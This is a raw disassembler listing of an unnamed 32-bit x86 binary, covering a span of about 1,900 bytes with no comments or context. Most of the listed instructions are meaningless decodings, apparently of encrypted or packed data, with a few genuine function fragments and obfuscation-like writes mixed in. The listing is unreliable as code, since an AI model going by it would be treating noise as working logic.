  40b596:	add    BYTE PTR ds:0x42f39e5b,ah
  40b59c:	and    al,al
  40b59e:	lods   eax,DWORD PTR ds:[esi]
  40b59f:	aad    0xbe
  40b5a1:	ins    DWORD PTR es:[edi],dx
  40b5a2:	fwait
  40b5a3:	dec    edx
  40b5a4:	ins    DWORD PTR es:[edi],dx
  40b5a5:	fld    st(2)
  40b5a7:	xor    BYTE PTR [edi+edx*8],0x0
  40b5ab:	push   ecx
  40b5ac:	rol    ebp,cl
  40b5ae:	int    0x19
  40b5b0:	pop    ebx
  40b5b1:	in     eax,0xd
  40b5b3:	aad    0xbd
  40b5b5:	and    eax,0xd7b954a1
  40b5ba:	push   es
  40b5bb:	xchg   esp,eax
  40b5bc:	retf   0x541f
  40b5bf:	lock mov ds,edx
  40b5c2:	push   es
  40b5c3:	out    dx,al
  40b5c4:	scas   al,BYTE PTR es:[edi]
  40b5c5:	xor    dh,BYTE PTR [ebx]
  40b5c7:	mov    al,BYTE PTR [ebx+ebx*8-0x41]
  40b5cb:	xchg   esi,eax
  40b5cc:	sbb    dl,dl
  40b5ce:	repnz daa 
  40b5d0:	push   0xecb8f8a0
  40b5d5:	adc    bh,BYTE PTR [esi-0x1b]
  40b5d8:	mov    edi,DWORD PTR [edx+0x6acbba1b]
  40b5de:	dec    ebp
  40b5df:	cdq    
  40b5e0:	jne    0x40b628
  40b5e2:	mov    esi,ebx
  40b5e4:	or     ecx,DWORD PTR [eax]
  40b5e6:	jp     0x40b662
  40b5e8:	mov    ah,0x29
  40b5ea:	jg     0x40b584
  40b5ec:	push   ebx
  40b5ed:	sub    edx,esp
  40b5ef:	xor    bl,BYTE PTR [eax-0x58]
  40b5f2:	push   0xffffffe2
  40b5f4:	test   al,0x4b
  40b5f6:	lea    esp,[eax-0x21f1417d]
  40b5fc:	push   0x3fa99697
  40b601:	test   DWORD PTR [eax],esi
  40b603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b604:	repnz or edx,DWORD PTR [esi+eax*8+0x68]
  40b609:	sbb    ah,BYTE PTR [edi+0x56122eb4]
  40b60f:	iret   
  40b610:	test   al,0x68
  40b612:	shl    dh,cl
  40b614:	pop    esi
  40b615:	cmp    DWORD PTR [eax-0x7a65f8f4],0xffffffb7
  40b61c:	imul   ebp,DWORD PTR [edi+0x573d0bf3],0x49db7492
  40b626:	les    ecx,FWORD PTR [esi-0x28]
  40b629:	shl    BYTE PTR [edi-0x1bdc598d],1
  40b62f:	jb     0x40b5bc
  40b631:	inc    esi
  40b632:	stc    
  40b633:	mov    dh,0x86
  40b635:	cdq    
  40b636:	test   DWORD PTR [ecx+0x3d],0x81f1b4de
  40b63d:	mov    DWORD PTR [esi-0xd],0x7afcde6
  40b644:	sub    eax,0x15867f1e
  40b649:	into   
  40b64a:	jb     0x40b67f
  40b64c:	jnp    0x40b645
  40b64e:	push   ss
  40b64f:	mov    esp,0x97c4c182
  40b654:	mov    eax,0x93ec5838
  40b659:	loop   0x40b6a8
  40b65b:	(bad)  
  40b65c:	sti    
  40b65d:	mov    ebx,DWORD PTR [edx]
  40b65f:	out    dx,eax
  40b660:	lock lahf 
  40b662:	xchg   DWORD PTR ds:0xccfc4a5a,ecx
  40b668:	mul    DWORD PTR [esi]
  40b66a:	add    DWORD PTR [edi+0xdf7a6bf],ebp
  40b670:	xlat   BYTE PTR ds:[ebx]
  40b671:	jns    0x40b6db
  40b673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b674:	jnp    0x40b604
  40b676:	push   ebx
  40b677:	mov    ebp,0x8c0da3cb
  40b67c:	cld    
  40b67d:	pop    eax
  40b67e:	ret    
  40b67f:	mov    ch,0x94
  40b681:	sub    DWORD PTR [ebx+eax*8-0x75],ebx
  40b685:	inc    eax
  40b686:	or     al,0x8b
  40b688:	or     ecx,ebp
  40b68a:	mov    bl,0x1
  40b68c:	add    BYTE PTR [eax],al
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    edx,DWORD PTR [ecx-0x57]
  40b69c:	leave  
  40b69d:	(bad)  
  40b69e:	sub    dh,bl
  40b6a0:	jo     0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b6df
  40b6a7:	xor    eax,DWORD PTR [esi-0x6a]
  40b6aa:	cli    
  40b6ab:	and    esi,esp
  40b6ad:	enter  0xc876,0xa1
  40b6b1:	in     eax,dx
  40b6b2:	and    DWORD PTR [eax+eax*4-0x6f],edx
  40b6b6:	outs   dx,DWORD PTR ds:[esi]
  40b6b7:	and    DWORD PTR [ecx-0x19fea5df],0x77
  40b6be:	or     ch,BYTE PTR [edi-0x6b]
  40b6c1:	fimul  DWORD PTR [edi+0x788b2a7f]
  40b6c7:	je     0x40b736
  40b6c9:	sbb    al,BYTE PTR [eax]
  40b6cb:	in     al,0xab
  40b6cd:	sbb    al,BYTE PTR [ebx]
  40b6cf:	out    dx,al
  40b6d0:	pop    ecx
  40b6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d2:	test   ah,dh
  40b6d4:	push   edi
  40b6d5:	inc    edi
  40b6d6:	je     0x40b688
  40b6d8:	sub    al,0xfe
  40b6da:	sub    al,0xe8
  40b6dc:	icebp  
  40b6dd:	cmp    esi,ebp
  40b6df:	push   eax
  40b6e0:	dec    edx
  40b6e1:	loope  0x40b71b
  40b6e3:	ss call 0xb91f4766
  40b6e9:	mov    ebx,0xe9acb5ab
  40b6ee:	jbe    0x40b6b4
  40b6f0:	aaa    
  40b6f1:	add    BYTE PTR [ebp+0x57],dh
  40b6f4:	jge    0x40b695
  40b6f6:	xchg   ebx,eax
  40b6f7:	adc    dh,dl
  40b6f9:	push   eax
  40b6fa:	add    esp,DWORD PTR [esi]
  40b6fc:	scas   al,BYTE PTR es:[edi]
  40b6fd:	imul   esi,DWORD PTR [ecx+0x285d4aaf],0x1c
  40b704:	mov    edx,0x3a995dae
  40b709:	addr16 push ebp
  40b70b:	sbb    BYTE PTR [edx-0x55bdcc79],al
  40b711:	pop    esi
  40b712:	shr    BYTE PTR [esp+ecx*8],0xa7
  40b716:	fwait
  40b717:	call   0xd2b3:0xf760f211
  40b71e:	inc    edi
  40b71f:	dec    ebx
  40b720:	push   esi
  40b721:	(bad)  
  40b722:	sub    al,0x1f
  40b724:	imul   ecx,DWORD PTR [esi],0x22
  40b727:	jbe    0x40b74f
  40b729:	add    al,0x35
  40b72b:	mov    esp,DWORD PTR [edx+0x56200c51]
  40b731:	leave  
  40b732:	dec    ebp
  40b733:	cmp    BYTE PTR [eax-0x3b903fe9],dl
  40b739:	xchg   ebp,eax
  40b73a:	into   
  40b73b:	(bad)  
  40b73c:	mov    ebx,0xb05b6c47
  40b741:	fidiv  WORD PTR [edx+0x7001bdfc]
  40b747:	mov    WORD PTR [ecx+0x6e],ss
  40b74a:	push   ebp
  40b74b:	imul   ebx,DWORD PTR [eax-0x5d],0x6
  40b74f:	ror    BYTE PTR ss:[ecx+edx*8-0x45d787a4],cl
  40b757:	(bad)  
  40b758:	mov    esi,0x1755895d
  40b75d:	fidivr WORD PTR [esi-0x420c8d52]
  40b763:	mov    ebx,0x55cc1a5d
  40b768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b769:	jae    0x40b6ff
  40b76b:	sub    edi,DWORD PTR [edx]
  40b76d:	idiv   DWORD PTR [esi]
  40b76f:	dec    eax
  40b770:	shl    DWORD PTR [ebx+ecx*8-0x13],1
  40b774:	(bad)  
  40b775:	xor    ecx,esi
  40b777:	jne    0x40b7e7
  40b779:	add    DWORD PTR [ebx+0x5b],ecx
  40b77c:	cmc    
  40b77d:	or     eax,0xef3d76bc
  40b782:	jnp    0x40b72a
  40b784:	in     al,0x6d
  40b786:	aam    0xb6
  40b788:	adc    esp,ecx
  40b78a:	fst    QWORD PTR [edi]
  40b78c:	das    
  40b78d:	sbb    eax,0xde3ae732
  40b792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b793:	or     BYTE PTR [edi-0x28],dh
  40b796:	xor    ebp,DWORD PTR [esi-0x27]
  40b799:	push   ds
  40b79a:	aad    0x21
  40b79c:	retf   
  40b79d:	loopne 0x40b799
  40b79f:	adc    al,bh
  40b7a1:	or     esi,DWORD PTR [ebx]
  40b7a3:	fwait
  40b7a4:	rcl    DWORD PTR [esi+0x69],0x22
  40b7a8:	retf   
  40b7a9:	pop    ss
  40b7aa:	cmp    eax,0xd4e418bd
  40b7af:	mov    bl,0xc6
  40b7b1:	aas    
  40b7b2:	mov    ah,0x9e
  40b7b4:	mov    bh,0x5e
  40b7b6:	cdq    
  40b7b7:	enter  0xd73e,0xf
  40b7bb:	dec    ecx
  40b7bc:	fisub  DWORD PTR [ebp-0x2be1498f]
  40b7c2:	test   al,0x27
  40b7c4:	mov    eax,ds:0x13946e36
  40b7c9:	sub    eax,DWORD PTR [eax]
  40b7cb:	aas    
  40b7cc:	shl    BYTE PTR [edi],0xe1
  40b7cf:	and    dh,al
  40b7d1:	in     al,0x62
  40b7d3:	xor    eax,0xaa38c097
  40b7d8:	mov    eax,ds:0xf2e1ceab
  40b7dd:	out    0x89,eax
  40b7df:	mov    eax,edi
  40b7e1:	shl    DWORD PTR [ebx],cl
  40b7e3:	(bad)
  40b7e6:	sbb    eax,0xfa672479
  40b7eb:	push   0x3
  40b7ed:	loope  0x40b780
  40b7ef:	dec    edx
  40b7f0:	inc    ebx
  40b7f1:	test   BYTE PTR ds:0xf1189de0,ch
  40b7f7:	push   0x3d
  40b7f9:	es cli 
  40b7fb:	repz js 0x40b7e0
  40b7fe:	cli    
  40b7ff:	inc    esp
  40b800:	(bad)  [ebp-0x62]
  40b803:	mov    dl,0x7e
  40b805:	cwde   
  40b806:	(bad)  
  40b807:	xchg   ecx,eax
  40b808:	adc    eax,0x4b1f94da
  40b80d:	sbb    al,0x3
  40b80f:	mov    edi,DWORD PTR [edi-0x69]
  40b812:	mov    ds:0x8adae58e,al
  40b817:	or     BYTE PTR [eax],dl
  40b819:	sub    DWORD PTR [edx],ecx
  40b81b:	popf   
  40b81c:	xor    edx,esp
  40b81e:	call   0x91d4:0x39c5b795
  40b825:	xor    BYTE PTR [esi-0x56],cl
  40b828:	in     eax,dx
  40b829:	xchg   ebx,eax
  40b82a:	shr    BYTE PTR [ecx-0x7f],1
  40b82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b82e:	loopne 0x40b88d
  40b830:	jge    0x40b822
  40b832:	mov    al,ds:0x678854af
  40b837:	inc    ebx
  40b838:	pop    ss
  40b839:	xchg   edx,eax
  40b83a:	sbb    DWORD PTR [ecx+0x2439db5c],0xffffffd5
  40b841:	mov    al,BYTE PTR [eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	or     ebx,eax
  40b859:	iret   
  40b85a:	aad    0x4f
  40b85c:	bnd jo 0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b7fe
  40b864:	cmp    dl,BYTE PTR [ecx]
  40b866:	repnz lahf 
  40b868:	mov    BYTE PTR [ecx*4+0x55141ffd],ah
  40b86f:	iret   
  40b870:	pop    ecx
  40b871:	gs or  eax,0x182a4b34
  40b877:	and    DWORD PTR [ebp-0x69],ebp
  40b87a:	push   ecx
  40b87b:	dec    ecx
  40b87c:	imul   edx,DWORD PTR [eax],0xa2e631da
  40b882:	int    0x70
  40b884:	ficomp WORD PTR [edi-0x6e063232]
  40b88a:	dec    esi
  40b88b:	out    dx,al
  40b88c:	xchg   edx,eax
  40b88d:	mov    al,0x4f
  40b88f:	jnp    0x40b850
  40b891:	adc    DWORD PTR [edi+0x65],esi
  40b894:	cmc    
  40b895:	cld    
  40b896:	mov    dl,0xb0
  40b898:	pop    esp
  40b899:	mov    DWORD PTR [ebp+0x3cbd4495],esi
  40b89f:	fbstp  TBYTE PTR [ecx+0x4ec56a1]
  40b8a5:	xor    bh,BYTE PTR ds:0xd0e4690d
  40b8ab:	hlt    
  40b8ac:	and    esi,DWORD PTR [ecx+0x51]
  40b8af:	femms  
  40b8b1:	jo     0x40b8af
  40b8b3:	push   DWORD PTR [edi]
  40b8b5:	push   esi
  40b8b6:	dec    edi
  40b8b7:	mov    BYTE PTR [ebp-0x37ba459f],bl
  40b8bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8be:	sbb    eax,0xc2197599
  40b8c3:	jae    0x40b88b
  40b8c5:	xchg   ebx,eax
  40b8c6:	icebp  
  40b8c7:	add    cl,dl
  40b8c9:	jns    0x40b880
  40b8cb:	jo     0x40b87e
  40b8cd:	xchg   edx,eax
  40b8ce:	sub    al,0x68
  40b8d0:	pop    es
  40b8d1:	mov    al,0x96
  40b8d3:	test   eax,0x9172246a
  40b8d8:	adc    esi,DWORD PTR [ebp-0x5a]
  40b8db:	mov    eax,0x3d652115
  40b8e0:	(bad)  
  40b8e1:	das    
  40b8e2:	aam    0x6a
  40b8e4:	scas   eax,DWORD PTR es:[edi]
  40b8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e6:	pop    esp
  40b8e7:	xor    dl,BYTE PTR [edx+0x54f598e4]
  40b8ed:	adc    esp,edx
  40b8ef:	repz retf 0x5471
  40b8f3:	push   ss
  40b8f4:	or     edi,DWORD PTR [ecx-0x32]
  40b8f7:	fcom   QWORD PTR [ebx-0x2e]
  40b8fa:	shr    BYTE PTR [ebp-0x1c715429],1
  40b900:	pop    edi
  40b901:	retf   0xc9ee
  40b904:	cli    
  40b905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b906:	sbb    ecx,0xaef9c981
  40b90c:	popa   
  40b90d:	enter  0x67ea,0x4
  40b911:	adc    al,BYTE PTR [ebp-0x24bdbe56]
  40b917:	pop    esp
  40b918:	jmp    0x40b960
  40b91a:	imul   edi,DWORD PTR [ebx],0x98e30e4d
  40b920:	fisttp QWORD PTR [ecx]
  40b922:	mov    ds:0xd2c4efd7,al
  40b927:	ror    BYTE PTR [ebx],1
  40b929:	jl     0x40b8fe
  40b92b:	mov    DWORD PTR [esi],edi
  40b92d:	fsub   DWORD PTR [ebx]
  40b92f:	(bad)  
  40b930:	mov    esi,DWORD PTR [ecx+0x3933e63c]
  40b936:	sub    DWORD PTR ds:0x93de6b95,esi
  40b93c:	adc    ebp,DWORD PTR [ebx-0x59]
  40b93f:	dec    eax
  40b940:	dec    ecx
  40b941:	push   eax
  40b942:	das    
  40b943:	outs   dx,DWORD PTR ds:[esi]
  40b944:	ins    BYTE PTR es:[edi],dx
  40b945:	test   eax,0x7a48e9b6
  40b94a:	enter  0x288b,0x5a
  40b94e:	cmc    
  40b94f:	into   
  40b950:	fcmovnb st,st(2)
  40b952:	ss retf 
  40b954:	add    eax,0x3ca19223
  40b959:	sbb    DWORD PTR [edi+0x6efaa1be],eax
  40b95f:	pop    edx
  40b960:	push   esi
  40b961:	bound  ecx,QWORD PTR [edx]
  40b963:	dec    eax
  40b964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b966:	ins    DWORD PTR es:[edi],dx
  40b967:	dec    esp
  40b968:	call   0xb78:0xc68a38cd
  40b96f:	repnz xor BYTE PTR ds:[ebx],0xa7
  40b974:	clc    
  40b975:	push   ss
  40b976:	or     BYTE PTR [esi-0x42167e8c],cl
  40b97c:	mov    ebx,0x370b1154
  40b981:	or     cl,BYTE PTR [esp+edx*1]
  40b984:	ja     0x40b9b8
  40b986:	sar    DWORD PTR [edi-0x7fc599a3],1
  40b98c:	or     DWORD PTR [ebx],edi
  40b98e:	fidivr DWORD PTR [esi+0x18]
  40b991:	xchg   BYTE PTR [ebp-0x3c153285],bl
  40b997:	mov    eax,0x73d6c385
  40b99c:	fld    QWORD PTR [ebx+esi*4-0x6c]
  40b9a0:	add    ch,BYTE PTR [edi-0x11]
  40b9a3:	(bad)  
  40b9a5:	call   0xf543:0x96330c53
  40b9ac:	daa    
  40b9ad:	inc    ebx
  40b9ae:	sar    BYTE PTR [esi-0x56],cl
  40b9b1:	test   esp,edx
  40b9b3:	jg     0x40b983
  40b9b5:	xchg   esp,eax
  40b9b6:	add    esi,DWORD PTR [eax+0x8fabed1]
  40b9bc:	sti    
  40b9bd:	js     0x40b9ef
  40b9bf:	mov    cr0,ebp
  40b9c2:	inc    esp
  40b9c3:	ds adc al,0x24
  40b9c6:	and    BYTE PTR [esi],cl
  40b9c8:	loopne 0x40b9ab
  40b9ca:	cwde   
  40b9cb:	push   ss
  40b9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9cd:	push   ebx
  40b9ce:	mov    dl,0x4f
  40b9d0:	(bad)  
  40b9d1:	in     al,dx
  40b9d2:	mov    edx,0x57441256
  40b9d7:	es jne 0x40ba18
  40b9da:	push   edi
  40b9db:	jp     0x40b9b0
  40b9dd:	pop    ss
  40b9de:	ja     0x40ba22
  40b9e0:	mov    edx,0x708caa27
  40b9e5:	mov    ebx,0x8aa4393d
  40b9ea:	sbb    BYTE PTR [esi-0x2af637ca],0xf9
  40b9f1:	in     eax,dx
  40b9f2:	mov    edx,DWORD PTR ds:0x548417ed
  40b9f8:	das    
  40b9f9:	lea    ebx,ds:0x3426202e
  40b9ff:	inc    edi
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x53f10d6b
  40ba45:	adc    BYTE PTR ds:0x7070f0e4,al
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba1b
  40ba50:	mov    ah,0xc6
  40ba52:	popa   
  40ba53:	gs pop ss
  40ba55:	in     eax,dx
  40ba56:	push   ebx
  40ba57:	out    dx,eax
  40ba58:	mov    bl,0x78
  40ba5a:	push   0x64
  40ba5c:	out    dx,eax
  40ba5d:	sub    eax,0x50a90c10
  40ba62:	push   esp
  40ba63:	nop
  40ba64:	jecxz  0x40ba4a
  40ba66:	bound  edx,QWORD PTR [edi-0x41731632]
  40ba6c:	arpl   WORD PTR [edx+0x72],si
  40ba6f:	lock mov bh,0x7d
  40ba72:	div    BYTE PTR [esp+edi*1+0xb59fb09]
  40ba79:	sub    eax,0x8a553cb7
  40ba7e:	aaa    
  40ba7f:	cli    
  40ba80:	mov    cl,BYTE PTR [esi]
  40ba82:	and    eax,0xb507ade5
  40ba87:	(bad)  
  40ba88:	outs   dx,DWORD PTR ds:[esi]
  40ba89:	outs   dx,BYTE PTR ds:[esi]
  40ba8a:	adc    ebx,esp
  40ba8c:	dec    eax
  40ba8d:	bound  esp,QWORD PTR [esi-0x658c1caa]
  40ba93:	dec    ecx
  40ba94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba96:	xor    esi,DWORD PTR [esi+0x2ad16c75]
  40ba9c:	out    0x23,eax
  40ba9e:	push   0x883e6334
  40baa3:	xor    DWORD PTR ds:0x2937bf95,ecx
  40baa9:	fadd   st(7),st
  40baab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baac:	jo     0x40bad0
  40baae:	adc    DWORD PTR [eax+0x22c22dcb],ebp
  40bab4:	xor    al,0xd0
  40bab6:	aad    0xb5
  40bab8:	inc    esi
  40bab9:	(bad)  
  40baba:	out    dx,al
  40babb:	push   ds
  40babc:	adc    DWORD PTR [eax+esi*2+0x52b3907e],esp
  40bac3:	mov    cl,0xe
  40bac5:	push   cs
  40bac6:	mov    eax,0x4896255f
  40bacb:	call   0x9051f30d
  40bad0:	les    ebp,FWORD PTR [esi+0x6aac960e]
  40bad6:	and    BYTE PTR [ebx],0x8
  40bad9:	push   0x8fadf0b6
  40bade:	jmp    0x948ac7be
  40bae3:	lock fsub st(4),st
  40bae6:	sub    al,BYTE PTR [edi-0x3771dfbb]
  40baec:	sub    BYTE PTR [eax+0x34566a71],dl
  40baf2:	mov    ebp,0xbfb64c31
  40baf7:	mov    ebp,0xd937175e
  40bafc:	push   ebp
  40bafd:	pop    esp
  40bafe:	stos   DWORD PTR es:[edi],eax
  40baff:	xchg   ebx,eax
  40bb00:	stos   DWORD PTR es:[edi],eax
  40bb01:	dec    ecx
  40bb02:	lods   eax,DWORD PTR ds:[esi]
  40bb03:	fsub   QWORD PTR [edi+0x4284b137]
  40bb09:	lods   eax,DWORD PTR ds:[esi]
  40bb0a:	push   ebp
  40bb0b:	ins    DWORD PTR es:[edi],dx
  40bb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb0d:	adc    BYTE PTR [ecx-0x4dbdefd0],ch
  40bb13:	cli    
  40bb14:	cmp    DWORD PTR [ebx-0x1a],eax
  40bb17:	or     eax,0x1075fd7d
  40bb1c:	mov    ebp,0xfa66e6d6
  40bb21:	pop    esp
  40bb22:	pop    edx
  40bb23:	pop    eax
  40bb24:	test   ebp,esp
  40bb26:	sbb    eax,0x24cca970
  40bb2b:	or     eax,0x36894346
  40bb30:	cmp    eax,0x4cefcdda
  40bb35:	xchg   edx,eax
  40bb36:	inc    ebp
  40bb37:	sbb    DWORD PTR [edi-0x53],0xffffff8b
  40bb3b:	rol    BYTE PTR [esi-0x39],1
  40bb3e:	or     BYTE PTR [edx-0x73beb2f],dh
  40bb44:	xor    dh,BYTE PTR [eax]
  40bb46:	out    dx,eax
  40bb47:	mov    ah,ah
  40bb49:	loopne 0x40bb95
  40bb4b:	mov    ecx,0xad547aa6
  40bb50:	test   eax,0x348d2357
  40bb55:	cmp    DWORD PTR [ecx],0x2eeef4cc
  40bb5b:	shr    BYTE PTR [edx+0x22ecb39c],cl
  40bb61:	jmp    0xf74930d8
  40bb66:	sbb    eax,0xf56e7a09
  40bb6b:	cld    
  40bb6c:	ret    0x6767
  40bb6f:	sbb    eax,0x4ec27d5f
  40bb74:	scas   eax,DWORD PTR es:[edi]
  40bb75:	inc    ebp
  40bb76:	test   BYTE PTR [ebp-0x25],dl
  40bb79:	xor    al,0x65
  40bb7b:	pop    eax
  40bb7c:	jne    0x40bb01
  40bb7e:	ins    DWORD PTR es:[edi],dx
  40bb7f:	iret   
  40bb80:	jg     0x40bbcd
  40bb82:	fidivr WORD PTR [ebx]
  40bb84:	sbb    al,0xcb
  40bb86:	cmp    dh,BYTE PTR ds:0x76b98d2c
  40bb8c:	jecxz  0x40bb19
  40bb8e:	mov    ds:0x4eff0f1a,al
  40bb93:	add    DWORD PTR [ebx+0x63c5e0cf],ebp
  40bb99:	icebp  
  40bb9a:	cmp    al,0xe8
  40bb9c:	dec    esp
  40bb9d:	fisub  DWORD PTR [eax+0x796e16e7]
  40bba3:	cmp    DWORD PTR [ebp-0x7e],ecx
  40bba6:	mov    gs,WORD PTR ss:[edi-0x72]
  40bbaa:	xor    al,0x36
  40bbac:	jno    0x40bb54
  40bbae:	enter  0xd4e8,0x4d
  40bbb2:	add    cl,dh
  40bbb4:	in     eax,dx
  40bbb5:	xor    eax,0x44d09f7f
  40bbba:	jge    0x40bc34
  40bbbc:	test   DWORD PTR [ecx],ecx
  40bbbe:	stc    
  40bbbf:	push   eax
  40bbc0:	retf   
  40bbc1:	dec    esi
  40bbc2:	pop    esp
  40bbc3:	stc    
  40bbc4:	mov    esp,ebx
  40bbc6:	gs test al,0x87
  40bbc9:	enter  0xf632,0x43
  40bbcd:	xor    ch,cl
  40bbcf:	lods   eax,DWORD PTR ds:[esi]
  40bbd0:	xchg   edx,eax
  40bbd1:	or     edi,DWORD PTR [ecx+eiz*1]
  40bbd4:	sub    eax,0xfa9e90c0
  40bbd9:	iret   
  40bbda:	mov    BYTE PTR [edx-0x18005f19],ah
  40bbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbe1:	(bad)  
  40bbe2:	loopne 0x40bc49
  40bbe4:	jno    0x40bc03
  40bbe6:	cli    
  40bbe7:	push   eax
  40bbe8:	cmp    ebp,DWORD PTR [ebp-0xf7ba75]
  40bbee:	jne    0x40bbe8
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x24e3f796],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	mov    ds:0x567ef5d4,eax
  40bc52:	outs   dx,BYTE PTR ds:[esi]
  40bc53:	ins    DWORD PTR es:[edi],dx
  40bc54:	xchg   DWORD PTR [eax],edx
  40bc56:	cdq    
  40bc57:	sub    al,dl
  40bc59:	cmp    DWORD PTR [edi+0x33],0xffffff9d
  40bc5d:	aas    
  40bc5e:	cmc    
  40bc5f:	gs stc 
  40bc61:	stc    
  40bc62:	adc    eax,0x6c1d9693
  40bc67:	in     eax,dx
  40bc68:	imul   ecx,DWORD PTR [edx-0x4c],0xd
  40bc6c:	sub    edx,DWORD PTR [esi+0x5d74ece7]
  40bc72:	loope  0x40bcd3
  40bc74:	cmp    BYTE PTR [edx-0x176c998f],ch
  40bc7a:	xchg   edi,eax
  40bc7b:	dec    eax
  40bc7c:	shl    BYTE PTR [ebx-0x79276f63],cl
  40bc82:	lock jl 0x40bcc1
  40bc85:	loope  0x40bc2e
  40bc87:	retf   
  40bc88:	fsub   DWORD PTR [ebx]
  40bc8a:	out    0x28,al
  40bc8c:	xchg   edx,eax
  40bc8d:	mov    DWORD PTR [eax+0x237eb930],eax
  40bc93:	mov    dl,0xed
  40bc95:	xchg   esp,eax
  40bc96:	fdiv   DWORD PTR ds:0xb1ef6c96
  40bc9c:	xlat   BYTE PTR ds:[ebx]
  40bc9d:	ret    
  40bc9e:	mov    BYTE PTR [ecx+edi*8],dl
  40bca1:	mov    edx,0x4cf3a0f1
  40bca6:	push   edx
  40bca7:	xchg   esp,eax
  40bca8:	adc    eax,0x2dd4edcb
  40bcad:	jbe    0x40bc3d
  40bcaf:	pop    edx
  40bcb0:	sub    eax,0x5b444fed
  40bcb5:	sbb    dl,BYTE PTR [esi+ebx*2]
  40bcb8:	loopne 0x40bcbb
  40bcba:	out    0xd0,eax
  40bcbc:	and    eax,0x9caebbdd
  40bcc1:	fldenv [ecx+edi*2+0x6f]
  40bcc5:	push   esp
  40bcc6:	repz imul edx,DWORD PTR [esi],0x5c
  40bcca:	loope  0x40bc5c
  40bccc:	sub    eax,0x2a2cb2b1
  40bcd1:	or     BYTE PTR [eax],dh
  40bcd3:	fldenv [esi-0x6b]
  40bcd6:	cmp    eax,0xc8137906
  40bcdb:	adc    eax,0x509f14ad
  40bce0:	fnstcw WORD PTR [ebp+0x5fa5f32b]
  40bce6:	jo     0x40bd0c
  40bce8:	sbb    BYTE PTR ds:0x7f39e00c,0x41
  40bcef:	retf   0x6496
  40bcf2:	push   edi
  40bcf3:	enter  0xf0b,0x92
  40bcf7:	cmp    al,0x76
  40bcf9:	lods   al,BYTE PTR ds:[esi]
  40bcfa:	push   edi
  40bcfb:	sub    ebp,DWORD PTR [ecx-0x3b]
  40bcfe:	dec    eax
  40bcff:	sti    
  40bd00:	inc    edi
  40bd01:	or     edi,eax
  40bd03:	jp     0x40bce4
  40bd05:	mov    esi,DWORD PTR [esi]
  40bd07:	xchg   ecx,eax
  40bd08:	mov    ds:0x93cd58d7,al
  40bd0d:	loop   0x40bcb6
  40bd0f:	push   ss
  40bd10:	jge    0x40bcf1
  40bd12:	sbb    BYTE PTR [edx-0x2894780f],al
